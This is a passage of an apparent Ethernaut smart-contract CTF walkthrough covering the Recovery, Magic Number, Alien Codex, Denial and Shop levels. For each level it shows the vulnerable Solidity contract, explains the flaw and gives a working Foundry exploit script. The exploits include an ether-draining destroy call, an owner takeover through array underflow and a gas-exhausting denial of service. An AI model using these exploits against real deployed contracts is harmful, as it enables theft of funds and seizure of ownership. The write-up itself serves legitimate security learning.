</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Recovery} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Recovery.sol"</span><span>;
</span><span>
</span><span>contract RecoverySolve is Script{
</span><span>    Recovery public recovery </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Recovery</span><span>(</span><span style=color:#0086b3>0xb85de0D636d9C15Be34104D65A9eE406001463bE</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        address myAddress </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envAddress</span><span>(</span><span style=color:#183691>"MY_ADDRESS"</span><span>));
</span><span>        
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Attack();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack Address : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(attack));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"MY Balance : "</span><span>, myAddress.balance);
</span><span>        
</span><span>        address _creator </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(recovery);
</span><span>
</span><span>        address token </span><span style=color:#a71d5d;font-weight:700>= </span><span>attack.</span><span style=color:#795da3;font-weight:700>exploit</span><span>(_creator, </span><span style=color:#795da3;font-weight:700>payable</span><span>(myAddress));
</span><span>        
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Token Address : "</span><span>, token);
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"MY Balance : "</span><span>, myAddress.balance);
</span><span>
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>(address _creator, address payable _myAddress) </span><span style=color:#795da3;font-weight:700>public returns</span><span>(address){
</span><span>        address missedToken </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#795da3;font-weight:700>uint160</span><span>(</span><span style=color:#795da3;font-weight:700>uint256</span><span>(</span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(</span><span style=color:#795da3;font-weight:700>bytes1</span><span>(</span><span style=color:#0086b3>0xd6</span><span>), </span><span style=color:#795da3;font-weight:700>bytes1</span><span>(</span><span style=color:#0086b3>0x94</span><span>), </span><span style=color:#795da3;font-weight:700>address</span><span>(_creator), </span><span style=color:#795da3;font-weight:700>bytes1</span><span>(</span><span style=color:#0086b3>0x01</span><span>))))));
</span><span>
</span><span>        missedToken.</span><span style=color:#62a35c>call</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodeWithSignature</span><span>(</span><span style=color:#183691>"destroy(address)"</span><span>, _myAddress));
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>missedToken;
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/RecoverySolve.s.sol:RecoverySolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=18-magic-number>18 Magic Number</h1><p><code>MagicNum.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract MagicNum {
</span><span>
</span><span>  address public solver;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>() {}
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setSolver</span><span>(address _solver) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    solver </span><span style=color:#a71d5d;font-weight:700>= </span><span>_solver;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>/*
</span><span style=color:#969896;font-style:italic>    ____________/\\\_______/\\\\\\\\\_____        
</span><span style=color:#969896;font-style:italic>     __________/\\\\\_____/\\\///////\\\___       
</span><span style=color:#969896;font-style:italic>      ________/\\\/\\\____\///______\//\\\__      
</span><span style=color:#969896;font-style:italic>       ______/\\\/\/\\\______________/\\\/___     
</span><span style=color:#969896;font-style:italic>        ____/\\\/__\/\\\___________/\\\//_____    
</span><span style=color:#969896;font-style:italic>         __/\\\\\\\\\\\\\\\\_____/\\\//________   
</span><span style=color:#969896;font-style:italic>          _\///////////\\\//____/\\\/___________  
</span><span style=color:#969896;font-style:italic>           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
</span><span style=color:#969896;font-style:italic>            ___________\///_____\///////////////__
</span><span style=color:#969896;font-style:italic>  */
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. But the solver contract should be very small at most 10 OPCODES.</ol><ul><li>Solution</ul><ol><li>To solve this challenge we need to write a contract that return 42. But the contract should be written with at most 10 OPCODES.<li>We need write our contract in Assembly not in solidity, so that we can build very tiny contract with less OPCODES.<li>Then we can convert it into bytecode and deploy onto blockchain and then pass the address to the <code>setSolver()</code> function.<li>Bytecodes are divided into two main types in solidity. <ol><li>Runtime bytecode<li>Creation bytecode</ol><li>Runtime bytecode will be stored on blockchain and executes when a call happens<li>Creation code consist of <strong>init data</strong>, <strong>runtime data</strong> and <strong>constructor bytecode</strong>. We need to create a runtime code which returns 42 upon call and append it with some init data which is required to deploy a contract.</ol><pre style=color:#323232;background-color:#fff><code><span> Create a RUNTIME BYTECODE which returns 42 
</span><span> PUSH1 0x2a --> pushing 42 into stack
</span><span> PUSH1 0x00
</span><span> MSTORE --> Stores 0x2a at 0x00 location
</span><span> 
</span><span> PUSH 0x20  --> pushing 32 into stack
</span><span> PUSH 0x00  
</span><span> RETURN  --> returns value at 0x00 to 0x20 in memory
</span><span> 
</span><span> ---> Combining this will be runtime code : 602a60005260206000f3
</span></code></pre><pre style=color:#323232;background-color:#fff><code><span> // Creating Creation code
</span><span> 
</span><span> PUSH10 0x602a60005260206000f3
</span><span> PUSH 0x00
</span><span> MSTORE  --> Stores runtime bytecode at 0x00 in memory 
</span><span>
</span><span> PUSH 0x0a  --> push 10 into memory : Length of the run time code
</span><span> PUSH 0x16  --> push 22 into memory : Offset position
</span><span>   // MSTORE stores 0x0000000000000000000000602a60005260206000f3 
</span><span> RETURN
</span><span> 
</span><span> ---> Creation Code : 69602a60005260206000f3600052600a6016f3
</span></code></pre><p>We can use this creation code to deploy a contract using <code>create</code> opcode and pass the address of the deployed contract to <code>setSolver()</code>.<p><code>MagicNumSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{MagicNum} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/MagicNum.sol"</span><span>;
</span><span>
</span><span>contract MagicNumSolve is Script{
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack().</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    MagicNum public magicNum </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>MagicNum</span><span>(</span><span style=color:#0086b3>0x396D3C79ecde0C91F14562d41ecf0F7685016b65</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>       bytes memory bytecode </span><span style=color:#a71d5d;font-weight:700>= </span><span>hex</span><span style=color:#183691>"69602a60005260206000f3600052600a6016f3"</span><span>;
</span><span>       address _solver;
</span><span>        </span><span style=color:#969896;font-style:italic>// create(value, offset, size)
</span><span>       assembly {
</span><span>        _solver:</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>create</span><span>(</span><span style=color:#0086b3>0</span><span>, </span><span style=color:#795da3;font-weight:700>add</span><span>(bytecode, </span><span style=color:#0086b3>0x20</span><span>), </span><span style=color:#0086b3>0x13</span><span>)
</span><span>       }
</span><span>       </span><span style=color:#62a35c>require</span><span>(_solver </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>));
</span><span>       magicNum.</span><span style=color:#795da3;font-weight:700>setSolver</span><span>(_solver);
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/MagicNumSolve.s.sol:MagicNumSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=19-alien-codex>19 Alien Codex</h1><p><code>AlienCodex.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.5</span><span>.</span><span style=color:#0086b3>0</span><span>; 
</span><span>
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>'./helpers/Ownable-05.sol'</span><span>;
</span><span>
</span><span>contract AlienCodex is Ownable{
</span><span>
</span><span>  bool public contact;
</span><span>  bytes32[] public codex;
</span><span>
</span><span>  modifier </span><span style=color:#795da3;font-weight:700>contacted</span><span>() {
</span><span>    </span><span style=color:#795da3;font-weight:700>assert</span><span>(contact);
</span><span>    _;
</span><span>  }
</span><span>  
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>makeContact</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    contact </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>record</span><span>(bytes32 _content) </span><span style=color:#795da3;font-weight:700>contacted public </span><span>{
</span><span>    codex.</span><span style=color:#62a35c>push</span><span>(_content);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>retract</span><span>() </span><span style=color:#795da3;font-weight:700>contacted public </span><span>{
</span><span>    codex.length</span><span style=color:#a71d5d;font-weight:700>--</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>revise</span><span>(uint i, bytes32 _content) </span><span style=color:#795da3;font-weight:700>contacted public </span><span>{
</span><span>    codex[i] </span><span style=color:#a71d5d;font-weight:700>= </span><span>_content;
</span><span>  }
</span><span>}
</span></code></pre><p><code>Ownable-05.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span>contract Ownable {
</span><span>    address private _owner;
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/*
</span><span style=color:#969896;font-style:italic>    Remaining code......
</span><span style=color:#969896;font-style:italic>    */
</span><span>}
</span><span>
</span></code></pre><ul><li>Goal</ul><ol><li>Claim ownership to complete the level.</ol><ul><li>Solution</ul><ol><li>First thing to note is the challenge contract uses pragma <code>0.5.0</code>, so it prone to integer overflow/underflows.<li>To call any function on the contract we need to call the <code>makeContact()</code> function initially.<li>Observe that <code>codex</code> is a dynamic bytes32 array. Recall how dynamic arrays stored in storage layout.<li>AlineCodex inherits the Ownable contract which has the state variable <code>owner</code>. It will be stored at slot 0 combined with <code>contacted</code> variable.<li>Here, in the slot 1 the legth of the <code>codex</code> array will be stored and it will be updated whenever a new element is pushed onto the array.<li>AleinCodex also changes the length of the <code>codex</code> with <code>retract()</code> function.<li><code>revise()</code> method allows us to modify any existing element of the <code>codex</code> array. Keep in mind that each element will stored at different storage slot.<li>Initially the length of the <code>codex</code> is 0. If we call the <code>retract()</code> it will be <code>0 - 1</code> which results in underflow and stores the value <strong><code>2**256 - 1</code></strong> as the length . It is the maximum storage slot index of a contract in ethereum.<li>So, now the codex array has access to all the storage slots of the contract. We can use this to update the <code>owner</code> value which is stored at the slot 0.<li>For this we need to find the index of the slot 0. Dynamic arrays finds the elements starting from the slot number <code>uint(keccak256(SLOT_NUMBER_OF_LENGTH))</code>. So, the <code>codex</code> array elements starts from the slot <code>uint(keccak256(1))</code>.</ol><pre style=color:#323232;background-color:#fff><code><span> codex[0] ==> codex[keccack256(1)]  ==> slot keccack256(1)
</span><span> codex[1] ==> codex[keccack256(1)+1]  ==> slot keccack256(1)+1
</span></code></pre><ol start=10><li>We need to find the index of the slot 0. We can do this by pointing our <code>codex</code> array to <strong><code>2**256</code></strong> index, which is not available and result in an overflow and will points back to the slot 0.<li>So, we need pass the <code>2**256 - keccack256(1)</code> to the <code>revise()</code> method it will find the index of the slot by using the same method</ol><pre style=color:#323232;background-color:#fff><code><span> codex[keccack256(1) + 2**256 - keccack256(1)] 
</span><span> codex[2**256] ==> slot 2**256 ==> slot 0 (overflow)
</span></code></pre><ol start=12><li>This will result a overflow and <code>revise()</code> method will modify the content of the owner slot that is zero.</ol><p><code>AlienCodexSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>; 
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#969896;font-style:italic>// import {AlienCodex} from "../src/AlienCodex.sol"; // Not using AlienCodex source contract because of old compiler dependency
</span><span>
</span><span>contract AlienCodexSolve is Script{
</span><span>    IAlienCodex public alienCodex </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>IAlienCodex</span><span>(</span><span style=color:#0086b3>0x92FfB1bd2432d4F2EA1340209742a99FBbFD45d2</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        bytes32 slot0 </span><span style=color:#a71d5d;font-weight:700>= </span><span>vm.</span><span style=color:#62a35c>load</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(alienCodex), </span><span style=color:#795da3;font-weight:700>bytes32</span><span>(</span><span style=color:#795da3;font-weight:700>uint</span><span>(</span><span style=color:#0086b3>0</span><span>)));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#795da3;font-weight:700>logBytes32</span><span>(slot0);  </span><span style=color:#969896;font-style:italic>// contacted + owner
</span><span>
</span><span>        alienCodex.</span><span style=color:#795da3;font-weight:700>makeContact</span><span>();
</span><span>
</span><span>        alienCodex.</span><span style=color:#795da3;font-weight:700>retract</span><span>();  </span><span style=color:#969896;font-style:italic>// 0 - 1 ==> (2**256) [underflow]
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// codex[0] ==> codex[keccack256(1)]  ==> slot keccack256(1)
</span><span>        </span><span style=color:#969896;font-style:italic>// codex[1] ==> codex[keccack256(1)+1]  ==> slot keccack256(1)+1
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// codex[2**256 - keccack256(1)]  ==> codex[keccack256(1) + 2**256 - keccack256(1)] 
</span><span>        </span><span style=color:#969896;font-style:italic>//                                ==> codex[2**256] ==> slot 2**256 ==> slot 0 (overflow)
</span><span>
</span><span>        uint ownerSlot </span><span style=color:#a71d5d;font-weight:700>= </span><span>(((</span><span style=color:#0086b3>2</span><span style=color:#a71d5d;font-weight:700>**</span><span style=color:#0086b3>256</span><span>) </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#0086b3>1</span><span>) </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#795da3;font-weight:700>uint</span><span>(</span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encode</span><span>(</span><span style=color:#0086b3>1</span><span>))) </span><span style=color:#a71d5d;font-weight:700>+ </span><span style=color:#0086b3>1</span><span>); 
</span><span>        </span><span style=color:#969896;font-style:italic>// uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
</span><span>        bytes32 _content </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>bytes32</span><span>(</span><span style=color:#795da3;font-weight:700>uint256</span><span>(</span><span style=color:#795da3;font-weight:700>uint160</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"MY_ADDRESS"</span><span>))));
</span><span>        alienCodex.</span><span style=color:#795da3;font-weight:700>revise</span><span>(ownerSlot, _content);
</span><span>
</span><span>        bytes32 slot0After </span><span style=color:#a71d5d;font-weight:700>= </span><span>vm.</span><span style=color:#62a35c>load</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(alienCodex), </span><span style=color:#795da3;font-weight:700>bytes32</span><span>(</span><span style=color:#795da3;font-weight:700>uint</span><span>(</span><span style=color:#0086b3>0</span><span>)));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#795da3;font-weight:700>logBytes32</span><span>(slot0After);  </span><span style=color:#969896;font-style:italic>// contacted + owner
</span><span>
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span style=color:#a71d5d;font-weight:700>interface </span><span>IAlienCodex {
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>makeContact</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>;
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>record</span><span>(bytes32 _content) </span><span style=color:#795da3;font-weight:700>external</span><span>;
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>retract</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>;
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>revise</span><span>(uint i, bytes32 _content) </span><span style=color:#795da3;font-weight:700>external</span><span>;
</span><span>
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/AleinCodexSolve.s.sol:AleinCodexSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=20-denial>20 Denial</h1><p><code>Denial.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>contract Denial {
</span><span>
</span><span>    address public partner; </span><span style=color:#969896;font-style:italic>// withdrawal partner - pay the gas, split the withdraw
</span><span>    address public constant owner </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0xA9E</span><span>);
</span><span>    uint timeLastWithdrawn;
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint) withdrawPartnerBalances; </span><span style=color:#969896;font-style:italic>// keep track of partners balances
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setWithdrawPartner</span><span>(address _partner) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        partner </span><span style=color:#a71d5d;font-weight:700>= </span><span>_partner;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// withdraw 1% to recipient and 1% to owner
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        uint amountToSend </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(this).balance </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>100</span><span>;
</span><span>        </span><span style=color:#969896;font-style:italic>// perform a call without checking return
</span><span>        </span><span style=color:#969896;font-style:italic>// The recipient can revert, the owner will still get their share
</span><span>        partner.call{value:amountToSend}(</span><span style=color:#183691>""</span><span>);
</span><span>        </span><span style=color:#795da3;font-weight:700>payable</span><span>(owner).</span><span style=color:#795da3;font-weight:700>transfer</span><span>(amountToSend);
</span><span>        </span><span style=color:#969896;font-style:italic>// keep track of last withdrawal time
</span><span>        timeLastWithdrawn </span><span style=color:#a71d5d;font-weight:700>= </span><span>block.timestamp;
</span><span>        withdrawPartnerBalances[partner] </span><span style=color:#a71d5d;font-weight:700>+=  </span><span>amountToSend;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// allow deposit of funds
</span><span>    </span><span style=color:#795da3;font-weight:700>receive</span><span>() external payable {}
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// convenience function
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>contractBalance</span><span>() </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(uint) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#795da3;font-weight:700>address</span><span>(this).balance;
</span><span>    }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>Deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</ol><ul><li>Solution</ul><ol><li>We should revert the call when the owner calls the <code>withdraw()</code> function. But if we do a simple revert in our contract fallback it won't work.<li>Because withdraw function doesn't check for the return value.<li>One thing we can do is, drain the gas of the transaction that is sent by the owner.<li>Call to partner is made by the <code>call</code> which will forward all the remaining gas to the external call.<li>So, we can drain all the gas by writing a most expensive computation in Partner contract.<li>I have written an infinite loop inside the fallback of the Attack contract and registered the Attack contract as the partner in Denial contract.</ol><p><code>DenialSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Denial} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Denial.sol"</span><span>;
</span><span>
</span><span>contract DenialSolve is Script{
</span><span>    Denial public denial </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Denial</span><span>(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#0086b3>0x82091354dc7d529c2d52F4D99f7108630ECaE590</span><span>));
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Denial Balance : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(denial).balance);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack().</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>        
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    Denial public denial </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Denial</span><span>(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#0086b3>0x82091354dc7d529c2d52F4D99f7108630ECaE590</span><span>));
</span><span>    uint public x;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        denial.</span><span style=color:#795da3;font-weight:700>setWithdrawPartner</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this));
</span><span>        </span><span style=color:#969896;font-style:italic>// denial.withdraw();
</span><span>    }
</span><span>    </span><span style=color:#795da3;font-weight:700>fallback</span><span>() external payable{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>for </span><span>(uint i </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0</span><span>; i</span><span style=color:#a71d5d;font-weight:700>>=</span><span style=color:#0086b3>0</span><span>; i</span><span style=color:#a71d5d;font-weight:700>++</span><span>){
</span><span>            x </span><span style=color:#a71d5d;font-weight:700>= </span><span>x </span><span style=color:#a71d5d;font-weight:700>+ </span><span>i;
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/DenialSolve.s.sol:DenialSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=21-shop>21 Shop</h1><p><code>Shop.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>interface </span><span>Buyer {
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>price</span><span>() </span><span style=color:#795da3;font-weight:700>external view returns </span><span>(uint);
</span><span>}
</span><span>
</span><span>contract Shop {
</span><span>  uint public price </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>100</span><span>;
</span><span>  bool public isSold;
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>buy</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    Buyer _buyer </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Buyer</span><span>(msg.sender);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(_buyer.</span><span style=color:#795da3;font-weight:700>price</span><span>() </span><span style=color:#a71d5d;font-weight:700>>= </span><span>price </span><span style=color:#a71d5d;font-weight:700>&& !</span><span>isSold) {
</span><span>      isSold </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
